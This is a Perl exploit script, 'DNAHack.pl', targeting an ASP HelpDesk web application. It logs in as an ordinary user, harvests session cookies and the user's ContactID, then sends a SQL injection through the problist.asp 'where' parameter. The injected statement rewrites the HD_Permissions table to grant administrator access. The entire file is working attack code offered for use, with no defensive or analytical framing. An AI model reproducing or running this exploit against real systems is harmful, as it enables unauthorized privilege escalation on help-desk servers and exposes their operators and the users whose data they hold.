#!/usr/bin/perl
use IO::Socket;
use strict;

my $verbose = 0;

if (($#ARGV+1) < 4)
{
 print "Usage (Provided only ".($#ARGV+1)." parameters):\n";
 print "DNAHack.pl host path email password\n";
 print "host - IP/name formed (e.g. 192.168.1.243)\n";
 print "path - The path under which the product is installed (e.g. /HelpDesk/)\n";
 print "email - The email used to logon (e.g. example\@com.com)\n";
 print "password - The password used for the email provided (e.g. foobar)\n";
 exit(0);
}

my $host = $ARGV[0];
my $path = $ARGV[1];

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

if ($verbose)
{
 print "connected\n";
}

$remote->autoflush(1);

my $Email = $ARGV[2];
my $Password = $ARGV[3];

print "Grabbing initial cookie\n";

my $http = "GET /$path/logon.asp HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,ima
ge/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close
Referer: http://$host/$path/logon.asp

";

print $remote $http;
if ($verbose)
{
 print "HTTP: [".$http."]\n";
}

sleep(1);

my $Cookie = "";
while (<$remote>)
{
 if (/Set-Cookie: ([^;]+;)/)
 {
  $Cookie .= $1." ";
 }
 if ($verbose)
 {
  print "$_";
 }
}

print "Cookie: $Cookie\n";

close($remote);

my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

if ($verbose)
{
 print "connected\n";
}

$remote->autoflush(1);

print "Performing logon\n";

$http = "POST /$path/logon.asp HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Cookie: $Cookie
Connection: close
Referer: http://$host/$path/logon.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: ";

my $content = "EmailAddress=$Email&password=$Password&action=submit&submitBtn=Logon&Redirect=";

$http .= length($content) ."\r\n";

$http .= "\r\n$content";

print $remote $http;
if ($verbose)
{
 print "HTTP: [".$http."]\n";
}
 
sleep(1);

while (<$remote>)
{
 if (/Set-Cookie: ([^;]+;)/)
 {
  $Cookie .= $1." ";
 }

 if ($verbose)
 {
  print "$_";
 }
}

close($remote);

print "Cookie: $Cookie\n";

print "Grabbing ContactID\n";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );
unless ($remote) { die "cannot connect to http daemon on $host" }

if ($verbose)
{
 print "connected\n";
}

$remote->autoflush(1);

$http = "GET /helpdesk/createContact.asp?editself=1 HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close
Cookie: $Cookie

";

my $ContactID;

print $remote $http;

sleep(1);

while (<$remote>)
{
 if (/<input type="hidden" id="ContactID" name="ContactID" value="([0-9]+)">/)
 {
  $ContactID = $1;
 }
 if ($verbose)
 {
  print "$_";
 }
}

close $remote;

print "ContactID: $ContactID\n";

print "Gaining elvated privileges\n";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );
unless ($remote) { die "cannot connect to http daemon on $host" }
if ($verbose)
{
 print "connected\n";
}
$remote->autoflush(1);
                     
$http = "GET /$path/problist.asp?where=1%3D0+order+by+TicketId;+UPDATE+HD_Permissions+SET+denyPermission=0+WHERE+ContactId=$ContactID+-- HTTP/1.1
Host: $host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: close
Cookie: $Cookie

";

print "Gaining privileges\n";
print $remote $http;
sleep(1);

while (<$remote>)
{
 if ($verbose)
 {
  print "$_";
 }
}
print "\n";

close $remote;

print "Logon to the system as before, you should be able to view the 'Admin' menu\n";
